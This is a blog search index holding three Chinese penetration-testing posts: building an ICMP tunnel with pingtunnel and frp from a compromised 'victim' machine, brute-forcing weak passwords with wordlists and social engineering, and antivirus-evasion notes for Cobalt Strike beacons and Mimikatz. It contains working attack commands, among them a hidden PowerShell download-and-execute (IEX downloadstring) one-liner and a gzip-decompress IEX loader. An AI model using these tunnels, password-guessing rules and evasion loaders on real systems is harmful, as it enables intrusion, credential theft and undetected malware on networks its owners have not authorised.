<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pingtunnel搭建icmp隧道</title>
    <url>/2020/10/30/pingtunnel%E6%90%AD%E5%BB%BAicmp%E9%9A%A7%E9%81%93/</url>
    <content><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>这次实战中遇到了DNS、TCP不出网，ICMP出网的情况，而reGeorg不够稳定，于是考虑搭建ICMP隧道转发socks5流量。</p>
<a id="more"></a>

<h4 id="二、原理及工具"><a href="#二、原理及工具" class="headerlink" title="二、原理及工具"></a>二、原理及工具</h4><p>pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具。用于突破网络封锁，或是绕过WIFI网络的登陆验证，或是在某些网络加快网络传输速度。</p>
<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gk7rx68q2cj30xs0hg7bw.jpg" alt="image-20201030232122100"></p>
<h4 id="三、隧道搭建"><a href="#三、隧道搭建" class="headerlink" title="三、隧道搭建"></a>三、隧道搭建</h4><h5 id="1、建立ICMP通道"><a href="#1、建立ICMP通道" class="headerlink" title="1、建立ICMP通道"></a>1、建立ICMP通道</h5><p>受害机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F:\TEMP\pingtunnel32.exe -type client -l :4455 -s 118.178.88.46 -sock5 1</span><br></pre></td></tr></table></figure>

<p>vps</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type server</span><br></pre></td></tr></table></figure>

<h5 id="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"><a href="#2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）" class="headerlink" title="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"></a>2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）</h5><blockquote>
<p>别用IE的套接字当做socks5代理，proxifier全局代理或者浏览器socks5插件</p>
<p>虚拟机测试似乎不行</p>
</blockquote>
<h5 id="3、开启frp代理"><a href="#3、开启frp代理" class="headerlink" title="3、开启frp代理"></a>3、开启frp代理</h5><p>Frpc.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 118.178.88.46</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">http_proxy &#x3D; socks5:&#x2F;&#x2F;127.0.0.1:4455</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6667</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure>

<p>这里的关键是frp去连接服务端时需要配置本地socks5代理。</p>
<hr>
<p>最后，感谢戴哥哥和超哥的耐心解答。</p>
<h4 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h4><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
]]></content>
      <tags>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈弱口令爆破思路</title>
    <url>/2020/10/31/%E6%B5%85%E8%B0%88%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>无论是内网渗透还是外网渗透，无论是web应用还是ssh、rdp、mysql等常见应用，弱口令爆破都是<strong>值得</strong>尝试的一个途径。</p>
<a id="more"></a>

<h4 id="二、字典"><a href="#二、字典" class="headerlink" title="二、字典"></a>二、字典</h4><p>字典决定了弱口令爆破的成功与否，字典分为用户名和密码。</p>
<p>在近几次开展的攻防演戏活动中，整理了爆破成功的大概下面几种类型。</p>
<h5 id="1、用户名"><a href="#1、用户名" class="headerlink" title="1、用户名"></a>1、用户名</h5><p>常见用户名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">administrator</span><br><span class="line">admin</span><br><span class="line">Admin</span><br><span class="line">scacdmin</span><br><span class="line">strong</span><br><span class="line">user</span><br><span class="line">test</span><br><span class="line">test1</span><br><span class="line">john</span><br></pre></td></tr></table></figure>

<p>数字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">9</span><br><span class="line">123</span><br><span class="line">860</span><br></pre></td></tr></table></figure>

<p>手机号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">17865154061</span><br></pre></td></tr></table></figure>

<blockquote>
<p>收集那个地区的手机号进行爆破</p>
<p>社工公司内部员工</p>
</blockquote>
<p>姓名拼音</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yanli</span><br><span class="line">dj_yao</span><br><span class="line">yanshi</span><br></pre></td></tr></table></figure>

<blockquote>
<p>P牛的星球看到的：大型公司（员工数量5k+），可以根据中国姓名拼音Top500来做</p>
<p>对于千人及以下的中小型创业公司，企查查和爱企查爬一下这个公司的专利信息列表</p>
</blockquote>
<blockquote>
<p>使用下面的项目字典生成很简单</p>
<p><a href="https://github.com/LandGrey/ChineseMaskReflector">https://github.com/LandGrey/ChineseMaskReflector</a></p>
<p>目前我的字典包含如下（中国姓名top500），孙大圣为例</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sundasheng</span><br><span class="line">sunds</span><br><span class="line">dssun</span><br><span class="line">sds</span><br><span class="line">ds_sun</span><br><span class="line">dashengsun</span><br><span class="line">Sundasheng</span><br><span class="line">Sds</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面的也可以用到自定义密码生成中</p>
</blockquote>
<p>域名、地域名、机关名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>关键</p>
</blockquote>
<h5 id="2、密码"><a href="#2、密码" class="headerlink" title="2、密码"></a>2、密码</h5><p>常见密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123456</span><br><span class="line">admin</span><br><span class="line">manage</span><br><span class="line">strong</span><br><span class="line">11111</span><br><span class="line">admin123!</span><br><span class="line">12345678;abc</span><br><span class="line">12345!@#$%abc</span><br><span class="line">Passw0rd</span><br><span class="line">p@ssword</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>自定义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Admin&#x2F;Cx123456（cx市）</span><br><span class="line">xzadmin&#x2F;xz@123456（xz市）</span><br><span class="line">strong&#x2F;yyslj!@#123（yy市水利局）</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a></p>
</blockquote>
<p>先写入data.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zhejiang</span><br><span class="line">243536998</span><br><span class="line">sundasheng</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python pydictor.py -extend data.txt --level 3 --len 4 16</span><br></pre></td></tr></table></figure>

<blockquote>
<p>另外一个更加自定义的工具</p>
<p><a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases/tag/v1.1">https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases/tag/v1.1</a></p>
<p>使用举例：<a href="https://www.cnblogs.com/cwkiller/p/12741086.html">https://www.cnblogs.com/cwkiller/p/12741086.html</a></p>
</blockquote>
<p>域名+数字</p>
<p>域名+admin</p>
<p>admin+域名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">top100，</span><br><span class="line">mct@2020</span><br><span class="line">yanyi@mct.gov.cn</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jxsdyyyadmin	**市第一医院</span><br></pre></td></tr></table></figure>

<blockquote>
<p>下面的是以前看到的，忘记出处了。结合白鹿生成器快速生成</p>
</blockquote>
<p><strong>账号规则</strong><br>以下均可尝试大小写：<br>admin+用户名缩写，比如用户叫张三，账号为adminzs<br>地名，比如地名叫傻蛋，账号为shadan<br>域名缩写，比如网站为<a href="http://www.test.com/">www.test.com</a>，账号为test<br>驻点单位名缩写_人名缩写_运维所属公司名缩写，比如驻点单位为天真傻蛋云平台，运维叫做张三，所属公司是犯贱有限公司，账号为tzsd_zs_fj<br>地名_邮编号码，比如地名是傻蛋，对应编号是000000，账号为sd_000000<br>测试账号+人名，比如anquanceshi、test、ceshi、ceshi_zs等等。<br><strong>密码规则</strong><br>以下均可尝试大小写：<br>键盘字母连键+特殊符号+键盘数字连键，字母和数字对应，比如键盘上asdf连着，密码为asdf<a href="https://www.t00ls.net/space-uid-8446.html">@1234</a><br>单位名称缩写/域名+特殊符号+3位或4位随机数，比如<a href="http://www.test.com/">www.test.com</a>，密码为test@2016<br>单位名缩写+人名缩写@工号，比如天真傻蛋大数据平台，运维叫张三，工号9541，密码为tzsdzs@9541<br>运维公司缩写+特殊符号+工号，比如天真傻蛋公司，工号是59861，密码为tzsd@59861</p>
<p>用户名admin</p>
<p>密码域名+8899</p>
<h5 id="3、安全设备默认口令"><a href="#3、安全设备默认口令" class="headerlink" title="3、安全设备默认口令"></a>3、安全设备默认口令</h5><blockquote>
<p><a href="https://www.freebuf.com/column/235632.html">https://www.freebuf.com/column/235632.html</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&amp;mid=2247484399&amp;idx=1&amp;sn=eaba60ade227f6a26ee194dfecfac1ff&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&amp;mid=2247484399&amp;idx=1&amp;sn=eaba60ade227f6a26ee194dfecfac1ff&amp;scene=21#wechat_redirect</a></p>
</blockquote>
<h4 id="三、爆破思路"><a href="#三、爆破思路" class="headerlink" title="三、爆破思路"></a>三、爆破思路</h4><p>1、固定用户名爆破密码</p>
<p><code>admin</code>、<code>test</code>、<code>ceshi</code></p>
<p>2、固定密码爆破用户名</p>
<p><code>123456</code>、<code>111111</code></p>
<p>3、用户名与密码相同</p>
<p>4、验证码对抗</p>
<p><code>Captcha-killer</code>插件</p>
<h4 id="四、真实案例"><a href="#四、真实案例" class="headerlink" title="四、真实案例"></a>四、真实案例</h4><h5 id="1、学校VPN"><a href="#1、学校VPN" class="headerlink" title="1、学校VPN"></a>1、学校VPN</h5><p>微博超话获取到了学生的vpn账号</p>
<p>入学通知获取到了姓名、学号，社工获取身份证号</p>
<h5 id="2、离线爆破"><a href="#2、离线爆破" class="headerlink" title="2、离线爆破"></a>2、离线爆破</h5><p>一次实战中sql注入得到了后台账号密码，加盐md5，但是只解出了一组为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin1&#x2F;admin123!</span><br></pre></td></tr></table></figure>

<p>根据域名等信息，并根据上面的格式生成字典爆破出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x2F;*****123!</span><br></pre></td></tr></table></figure>

<h5 id="3、账号密码都为域名缩写"><a href="#3、账号密码都为域名缩写" class="headerlink" title="3、账号密码都为域名缩写"></a>3、账号密码都为域名缩写</h5><p>一次实战中<code>hp**/hp**</code></p>
]]></content>
      <tags>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀笔记</title>
    <url>/2020/12/17/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="http-beacon免杀"><a href="#http-beacon免杀" class="headerlink" title="http beacon免杀"></a>http beacon免杀</h3><blockquote>
<p>实测免杀效果好的几种方式</p>
</blockquote>
<h5 id="1-python"><a href="#1-python" class="headerlink" title="1.python"></a>1.python</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">远程加载shellcode+反序列化</span><br></pre></td></tr></table></figure>

<p><a href="https://mp.weixin.qq.com/s/-xpNqk-gx6iv-HB1mloH9w">https://mp.weixin.qq.com/s/-xpNqk-gx6iv-HB1mloH9w</a></p>
<h5 id="2-ShellcodeLoad"><a href="#2-ShellcodeLoad" class="headerlink" title="2.ShellcodeLoad"></a>2.ShellcodeLoad</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">自带多种加载方式。32位自带13种加载方式，64位自带12种加载方式。</span><br><span class="line">支持拓展。如果发现新的利用方式，按指定方式开发模板即可。</span><br><span class="line">shellcode自动随机加密。使用时间为种子，生成128位密钥进行加密，相同shellcode出来的加载器的md5也不相同。</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/knownsec/shellcodeloader">https://github.com/knownsec/shellcodeloader</a></p>
<h5 id="3-掩日"><a href="#3-掩日" class="headerlink" title="3.掩日"></a>3.掩日</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.0版本参考了 Avitor 的结构。使用了 DotNetToJscript 的代码。部分代码参考了网络资料。</span><br><span class="line">2.0版本修改使用了很多网络代码，因为各种转载，来源已不可考，在此表示感谢❤。</span><br><span class="line">3.0版本基于TheWover,Odzhan 的 Donut 项目，他们的技术水平及开源精神令人敬佩。3.0只是在他们的基础上做了一点微小的图形化工作。</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/1y0n/AV_Evasion_Tool">https://github.com/1y0n/AV_Evasion_Tool</a></p>
<h5 id="4-dll免杀"><a href="#4-dll免杀" class="headerlink" title="4.dll免杀"></a>4.dll免杀</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C格式shellcode异或加密写入dll文件</span><br><span class="line">当dll被调用或者被注入进其他进程时触发功能</span><br><span class="line">dll功能：解密shellcode并将其注入rundll32.exe进程</span><br></pre></td></tr></table></figure>

<h5 id="5-重明"><a href="#5-重明" class="headerlink" title="5.重明"></a>5.重明</h5><p><a href="https://github.com/lengjibo/FourEye">https://github.com/lengjibo/FourEye</a></p>
<h3 id="Mimikatz免杀"><a href="#Mimikatz免杀" class="headerlink" title="Mimikatz免杀"></a>Mimikatz免杀</h3><h5 id="1-xencrypt"><a href="#1-xencrypt" class="headerlink" title="1.xencrypt"></a>1.xencrypt</h5><p><a href="https://blog.csdn.net/lhh134/article/details/104640758">https://blog.csdn.net/lhh134/article/details/104640758</a></p>
<p>绕不过window defence2012</p>
<h5 id="2-procdump"><a href="#2-procdump" class="headerlink" title="2.procdump"></a>2.procdump</h5><p>绕不过window defence2012，生成的lsass.dmp被删</p>
<h5 id="3-sqlDumper-exe"><a href="#3-sqlDumper-exe" class="headerlink" title="3.sqlDumper.exe"></a>3.sqlDumper.exe</h5><p>绕过window defence2012，但是本地解密报错</p>
<h5 id="4-mimikatz-exe免杀"><a href="#4-mimikatz-exe免杀" class="headerlink" title="4.mimikatz.exe免杀"></a>4.mimikatz.exe免杀</h5><p>也绕不过window defence2012</p>
<h3 id="DNS-beacon免杀"><a href="#DNS-beacon免杀" class="headerlink" title="DNS beacon免杀"></a>DNS beacon免杀</h3><blockquote>
<p>能成功上线的是beacon(stageless)</p>
<p>这种beacon的特点是payload体积庞大，生成的RAW Payload也是一个完整Shellcode Loader的PE文件（约200KB）而不是一段shellcode（不足1KB）</p>
<p>CS4中的DNS Beacon才是真正纯粹的DNS隧道，前作中大家常用的方式都是以http的形式传递stage</p>
</blockquote>
<blockquote>
<p>那么上面看到的两种beacon有什么区别呢？查阅官方说明，翻译并归纳总结如下。<br>CS的马有两大类：一种是和灰鸽子类似的马，本身是带有完整功能的二进制程序；另一种马短小精悍，也是平时自己diy免杀马常用的，分为三个部分——攻击载荷（payload）、传输器（stager）和传输体（stage），传输器通过下载传输体将其拼接成真正可以回连teamserver的马子（payload），从而达到比较出色的伪装效果。<br>上面图中的那类stageless，顾名思义就是没有stager和stage的马，而是直接以payload为模版生成一个完整的二进制马，当然特征也是最明显的。</p>
</blockquote>
<h5 id="1-shellcode免杀"><a href="#1-shellcode免杀" class="headerlink" title="1.shellcode免杀"></a>1.shellcode免杀</h5><p>有个大问题就是，payload generator只支持32位</p>
<p><a href="https://i.hacking8.com/exe2shellcode/">https://i.hacking8.com/exe2shellcode/</a></p>
<p>一开始想把64位的stageless先转成shellcode，再免杀，但是这里的转化似乎有问题，测试失败。</p>
<h5 id="2-ps1免杀"><a href="#2-ps1免杀" class="headerlink" title="2.ps1免杀"></a>2.ps1免杀</h5><p><a href="https://www.cnblogs.com/forforever/p/13882312.html">https://www.cnblogs.com/forforever/p/13882312.html</a></p>
<img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb69myr1j30nk0es0v0.jpg" alt="image-20201218000952528" style="zoom:50%;" />



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -file beacon.ps1</span><br></pre></td></tr></table></figure>

<p>由于是stageless，这里的字符串比较长，本地写个python脚本转化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Byte[]]$acode &#x3D;  [Byte[]](这里放刚刚转码后的FromBase65String)</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb67syf5j31dk094aau.jpg" alt="image-20201217234030047"></p>
<img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb65u4urj30og0k00vf.jpg" alt="image-20201218001110085" style="zoom:50%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Byte[]]$var_c1 &#x3D;  [Byte[]](31,139,8,0,0,0,0,0,0,0,173)</span><br><span class="line">[Byte[]]$var_c2 &#x3D;  [Byte[]](199,96,206,103,88,42,4,0,0)</span><br><span class="line">$var_code&#x3D;$var_c1+$var_c2</span><br><span class="line"></span><br><span class="line">$s&#x3D;New-Object IO.MemoryStream(,$var_code);IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为不出http，利用边界机本身的web服务下载，成功上线</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.133.104.165:8081&#x2F;FCKEditor&#x2F;zp857&#39;))&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb63u5aqj31ni0tiq8f.jpg" alt="image-20201218172947047"></p>
]]></content>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
</search>
